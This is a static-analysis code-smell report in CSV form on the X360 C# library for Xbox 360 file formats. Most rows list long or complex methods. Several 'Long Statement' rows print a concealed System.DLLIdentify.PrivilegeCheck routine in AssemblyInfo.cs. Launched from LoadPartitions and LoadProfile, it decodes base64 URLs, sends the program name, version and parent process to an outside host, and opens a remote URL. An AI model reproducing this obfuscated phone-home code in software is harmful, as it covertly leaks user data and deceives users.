Implementation smell,Namespace,Class,File,Method,Description
Long Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,GPD,The method has 147 lines of code.
Long Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The method has 131 lines of code.
Long Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,SwitchNWrite,The method has 167 lines of code.
Long Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The method has 125 lines of code.
Long Method,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The method has 126 lines of code.
Complex Method,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,xInject,Cyclomatic complexity of the method is 10
Complex Method,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,Cyclomatic complexity of the method is 23
Complex Method,X360.FATX,FATXFolderEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,xRead,Cyclomatic complexity of the method is 9
Complex Method,X360.FATX,FATXPartition,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,FATXPartition,Cyclomatic complexity of the method is 12
Complex Method,X360.FATX,AllocationTable,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetBlocks,Cyclomatic complexity of the method is 9
Complex Method,X360.FATX,AllocationTable,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,WriteChain,Cyclomatic complexity of the method is 10
Complex Method,X360.FATX,AllocationTable,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetNewBlockChain,Cyclomatic complexity of the method is 10
Complex Method,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,Cyclomatic complexity of the method is 13
Complex Method,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,xReadToFolder,Cyclomatic complexity of the method is 20
Complex Method,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,Cyclomatic complexity of the method is 16
Complex Method,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,Cyclomatic complexity of the method is 11
Complex Method,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,ReadFolder,Cyclomatic complexity of the method is 8
Complex Method,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GetFile,Cyclomatic complexity of the method is 10
Complex Method,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,Cyclomatic complexity of the method is 11
Complex Method,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,IsValidXboxName,Cyclomatic complexity of the method is 8
Complex Method,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,Cyclomatic complexity of the method is 33
Complex Method,X360.Profile,GameGPD,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,xErase,Cyclomatic complexity of the method is 11
Complex Method,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,Cyclomatic complexity of the method is 32
Complex Method,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,Cyclomatic complexity of the method is 33
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,GPD,Cyclomatic complexity of the method is 55
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,GetEntries,Cyclomatic complexity of the method is 15
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,UpdateSync,Cyclomatic complexity of the method is 19
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,ContainsEntry,Cyclomatic complexity of the method is 17
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,Cyclomatic complexity of the method is 38
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,AddString,Cyclomatic complexity of the method is 9
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xDeleteSetting,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,Cyclomatic complexity of the method is 9
Complex Method,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,XSetStructure,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,Cyclomatic complexity of the method is 10
Complex Method,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,GenerateHashBlock,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,GenerateHashOffset,Cyclomatic complexity of the method is 10
Complex Method,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FixHashes,Cyclomatic complexity of the method is 12
Complex Method,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,read,Cyclomatic complexity of the method is 12
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xEntriesToFile,Cyclomatic complexity of the method is 11
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,Cyclomatic complexity of the method is 12
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xWriteHeader,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,SwitchNWrite,Cyclomatic complexity of the method is 19
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,GetRecord,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xAllocateBlocks,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,Cyclomatic complexity of the method is 10
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,Cyclomatic complexity of the method is 19
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,Cyclomatic complexity of the method is 12
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,AddFolder,Cyclomatic complexity of the method is 10
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,GetFolder,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,GetFiles,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,LoadProfile,Cyclomatic complexity of the method is 14
Complex Method,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,SaveProfileInfo,Cyclomatic complexity of the method is 10
Complex Method,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,Cyclomatic complexity of the method is 9
Complex Method,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,Cyclomatic complexity of the method is 16
Complex Method,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,Cyclomatic complexity of the method is 9
Complex Method,X360.SVOD,SVODFuncs,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,GenerateHashOffset,Cyclomatic complexity of the method is 9
Long Parameter List,X360.FATX,FATXEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,FATXEntry,The method has 6 parameters.
Long Parameter List,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,Write,The method has 5 parameters.
Long Parameter List,X360.IO,Drive,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,CreateFile,The method has 7 parameters.
Long Parameter List,X360.IO,Drive,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,DeviceIoControl,The method has 8 parameters.
Long Parameter List,X360.Profile,XDBFEntry,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,XDBFEntry,The method has 5 parameters.
Long Parameter List,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,ItemEntry,The method has 6 parameters.
Long Parameter List,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FileEntry,The method has 6 parameters.
Long Parameter List,X360.STFS,FolderEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FolderEntry,The method has 5 parameters.
Long Parameter List,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,XTakeHash,The method has 5 parameters.
Long Parameter List,X360.Security.Cryptography.Kerberos,KerbExtenz,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,KerberosDecrypt,The method has 5 parameters.
Long Parameter List,X360.Security.Cryptography,RC4Quick,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,RunKerberosDecrypt,The method has 5 parameters.
Long Statement,X360,XAbout,C:\repos\mtolly_X360\X360\X360\About.cs,CheckForUpdate,The length of the statement  "		StreamReader x = X360.Other.VariousFunctions.GetWebPageResponse ("http://skunkiebutt.com/ProductCheck.php?product=X360&command=read"); " is 134.
Long Statement,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The length of the statement  "		if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS) " is 123.
Long Statement,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The length of the statement  "					io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC)); " is 146.
Long Statement,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The length of the statement  "				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC)); " is 146.
Long Statement,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The length of the statement  "		Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false); " is 122.
Long Statement,X360.FATX,FATXPartition,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,BlockToOffset,The length of the statement  "		return ((xBlock == Constants.FATX16End || xBlock == 0 || xBlock >= xTable.BlockCount) ? -1 : ((long)(xBlock - 1) * (long)xBlockSize) + xDataStart); " is 147.
Long Statement,X360.FATX,FATXPartition,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,BlockToOffset,The length of the statement  "		return ((xBlock == Constants.FATX32End || xBlock == 0 || xBlock >= xTable.BlockCount) ? -1 : ((long)(xBlock - 1) * (long)xBlockSize) + xDataStart); " is 147.
Long Statement,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The length of the statement  "	new System.Threading.Thread (new System.Threading.ParameterizedThreadStart (System.DLLIdentify.PrivilegeCheck)).Start (System.Threading.Thread.CurrentThread); " is 158.
Long Statement,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The length of the statement  "		/*FATXPartition x = new FATXPartition((long)HDD.Partition1' (long)HDD.Partition2 - (long)HDD.Partition1' this' current);" is 120.
Long Statement,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The length of the statement  "                }*/FATXPartition x = new FATXPartition ((long)HDD.Partition3' (long)HDD.Partition4 - (long)HDD.Partition3' this' "System"); " is 123.
Long Statement,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,XSetStream,The length of the statement  "		xStream = (xftype == DJFileMode.Create) ? File.Create (xFile) : new FileStream (xFile' FileMode.Open' FileAccess.ReadWrite' FileShare.None); " is 140.
Long Statement,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The length of the statement  "		return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]); " is 125.
Long Statement,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The length of the statement  "		return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]); " is 150.
Long Statement,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The length of the statement  "		return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]); " is 175.
Long Statement,X360.IO,Drive,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,GetGeom,The length of the statement  "	DeviceIoControl (xSFH' 0x70000' IntPtr.Zero' 0' ref xGeom' (uint)Marshal.SizeOf (typeof(DiskGeometry))' out blah' IntPtr.Zero); " is 127.
Long Statement,X360.IO,Drive,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,MakeHandle,The length of the statement  "	xSFH = CreateFile (@"\\.\" + DeviceName.ToUpper ()' FileAccess.ReadWrite' FileShare.ReadWrite' IntPtr.Zero' FileMode.Open' FlagsAndAttributes.Device | FlagsAndAttributes.NoBuffering | FlagsAndAttributes.Write_Through' IntPtr.Zero); " is 231.
Long Statement,X360.Other,AssemblyFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GrabParentProcessName,The length of the statement  "		return System.Diagnostics.Process.GetProcessById ((int)(new System.Diagnostics.PerformanceCounter ("Process"' "Creating Process ID"' System.Diagnostics.Process.GetCurrentProcess ().ProcessName).NextValue ())).ProcessName; " is 221.
Long Statement,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The length of the statement  "		return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2)); " is 169.
Long Statement,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xFixOffset,The length of the statement  "	xDirectoryOffset = xPackage.STFSStruct.GenerateDataOffset (xPackage.xFileBlocks [xEntryID / 0x40].ThisBlock) + ((0x40 * xEntryID) % 0x40); " is 138.
Long Statement,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FixHashes,The length of the statement  "			xPackage.XTakeHash (xPackage.GenerateDataOffset (x.ThisBlock)' xPackage.GenerateHashOffset (x.ThisBlock' TreeLevel.L0)' 0x1000); " is 128.
Long Statement,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FixHashes,The length of the statement  "				xPackage.XTakeHash (xPackage.GenerateBaseOffset ((x * Constants.BlockLevel [0])' TreeLevel.L0)' xPackage.GenerateHashOffset ((x * Constants.BlockLevel [0])' TreeLevel.L1)' 0x1000); " is 180.
Long Statement,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FixHashes,The length of the statement  "					xPackage.XTakeHash (xPackage.GenerateBaseOffset ((x * Constants.BlockLevel [1])' TreeLevel.L1)' xPackage.GenerateHashOffset ((x * Constants.BlockLevel [1])' TreeLevel.L2)' 0x1000); " is 180.
Long Statement,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xReplace,The length of the statement  "		BlockRecord[] xFileAlloc = xPackage.xAllocateBlocks (xIOin.BlockCountSTFS ()' xEntAlloc [xEntAlloc.Length - 1].ThisBlock + 1); " is 126.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xExtractPayload,The length of the statement  "			DJsIO xhead = new DJsIO (VariousFunctions.xGetUnusedFile (xOutLocale + "/" + dlcname () + ".txt")' DJFileMode.Create' true); " is 124.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The length of the statement  "		return new Verified (ItemType.Signature' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xHeadr)' xSiggy)' 0x22C' xSigSpot); " is 135.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xWriteTables,The length of the statement  "			XTakeHash (GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0)' GenerateHashOffset (i * Constants.BlockLevel [0]' TreeLevel.L1)' 0x1000' ref xIO); " is 158.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xWriteTables,The length of the statement  "				XTakeHash (GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1)' GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L2)' 0x1000' ref xIO); " is 162.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xAddFile,The length of the statement  "		ItemEntry x = new ItemEntry (xFileName' (int)xIOIn.Length' false' (ushort)(xFileDirectory.Count + xFolderDirectory.Count)' Folder' this); " is 137.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The length of the statement  "					long xInputLocale = xSTFSStruct.GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0) + (current.Index << 0xC); " is 121.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The length of the statement  "						xReturn.Add (new Verified (ItemType.TableTree0' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale)); " is 123.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The length of the statement  "						long xInputLocale = xSTFSStruct.GenerateBaseOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1) + (current.Index << 0xC); " is 123.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The length of the statement  "						xReturn.Add (new Verified (ItemType.TableTree1' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale)); " is 123.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The length of the statement  "			xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC)); " is 171.
Long Statement,X360.STFS,CreateSTFS,C:\repos\mtolly_X360\X360\X360\STFS\Create.cs,AddFile,The length of the statement  "	if (UppedDirectCount >= 0x3FF || UppedTotalBlocks (CreateTools.BlockCount (FileLocation)) > BlockStep [2] || FilePath == null || FilePath == "") " is 144.
Long Statement,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,LoadProfile,The length of the statement  "	new System.Threading.Thread (new System.Threading.ParameterizedThreadStart (System.DLLIdentify.PrivilegeCheck)).Start (System.Threading.Thread.CurrentThread); " is 158.
Long Statement,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The length of the statement  "	if (ContentType != PackageType.HDDInstalledGame && ContentType != PackageType.OriginalXboxGame && ContentType != PackageType.GamesOnDemand && ContentType != PackageType.SocialTitle) " is 181.
Long Statement,System,DLLIdentify,C:\repos\mtolly_X360\X360\X360\Properties\AssemblyInfo.cs,PrivilegeCheck,The length of the statement  "		string result = new IO.StreamReader (Net.WebRequest.Create (Encoding.ASCII.GetString (Convert.FromBase64String ("aHR0cDovL3NrdW5raWVidXR0LmNvbS9BcHBDaGVjay5waHA/cHJvY2Vzcz0=")) + System.Windows.Forms.Application.ProductName + Encoding.ASCII.GetString (Convert.FromBase64String ("JnZlcnNpb249")) + System.Windows.Forms.Application.ProductVersion + Encoding.ASCII.GetString (Convert.FromBase64String ("JnBhcmVudD0=")) + System.Diagnostics.Process.GetProcessById ((int)(new System.Diagnostics.PerformanceCounter ("Process"' "Creating Process ID"' Diagnostics.Process.GetCurrentProcess ().ProcessName).NextValue ())).ProcessName).GetResponse ().GetResponseStream ()).ReadLine (); " is 675.
Long Statement,System,DLLIdentify,C:\repos\mtolly_X360\X360\X360\Properties\AssemblyInfo.cs,PrivilegeCheck,The length of the statement  "			Diagnostics.Process.Start (Encoding.ASCII.GetString (Convert.FromBase64String ("aHR0cDovL3NrdW5raWVidXR0LmNvbS9sb2wudHh0"))); " is 125.
Complex Conditional,X360.FATX,FATXEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,FATXEntry,The conditional expression  "xNLen == 0xE5 || xNLen == 0xFF || xNLen == 0 || xNLen > 0x2A"  is complex.
Complex Conditional,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,restoreimg,The conditional expression  "xImageDrive == null || xImageDrive.IsDriveIO || !xImageDrive.Success || xImageDrive.Type != xType"  is complex.
Complex Conditional,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The conditional expression  "desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2)"  is complex.
Complex Conditional,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The conditional expression  "xHeader.ThisType == PackageType.HDDInstalledGame || xHeader.ThisType == PackageType.OriginalXboxGame || xHeader.ThisType == PackageType.GamesOnDemand || xHeader.ThisType == PackageType.SocialTitle"  is complex.
Complex Conditional,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The conditional expression  "xSession.HeaderData.ThisType == PackageType.GamesOnDemand || xSession.HeaderData.ThisType == PackageType.HDDInstalledGame || xSession.HeaderData.ThisType == PackageType.OriginalXboxGame || xSession.HeaderData.ThisType == PackageType.SocialTitle"  is complex.
Complex Conditional,X360.STFS,CreateSTFS,C:\repos\mtolly_X360\X360\X360\STFS\Create.cs,AddFile,The conditional expression  "UppedDirectCount >= 0x3FF || UppedTotalBlocks (CreateTools.BlockCount (FileLocation)) > BlockStep [2] || FilePath == null || FilePath == """  is complex.
Complex Conditional,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,AddGame,The conditional expression  "xUserGPD == null || !xUserGPD.xIO.Accessed || !xTitleGPD.xIO.Accessed || !xTitleGPD.IsValid"  is complex.
Complex Conditional,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The conditional expression  "ContentType != PackageType.HDDInstalledGame && ContentType != PackageType.OriginalXboxGame && ContentType != PackageType.GamesOnDemand && ContentType != PackageType.SocialTitle"  is complex.
Complex Conditional,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,The conditional expression  "xHeaderIO.ReadByte () != 0x24 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 0x11"  is complex.
Complex Conditional,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,ExtractData,The conditional expression  "!dataloaded || xIOOut == null || !xIOOut.Accessed || !ActiveCheck ()"  is complex.
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.Media,MusicFile,C:\repos\mtolly_X360\X360\X360\Media\Music.cs,MusicFile,The constructor "MusicFile" calls a virtual method "Dispose".
Virtual Method Call from Constructor,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,UserAccount,The constructor "UserAccount" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,UserAccount,The constructor "UserAccount" calls a virtual method "ReadStream".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Dispose".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Flush".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Flush".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Close".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Flush".
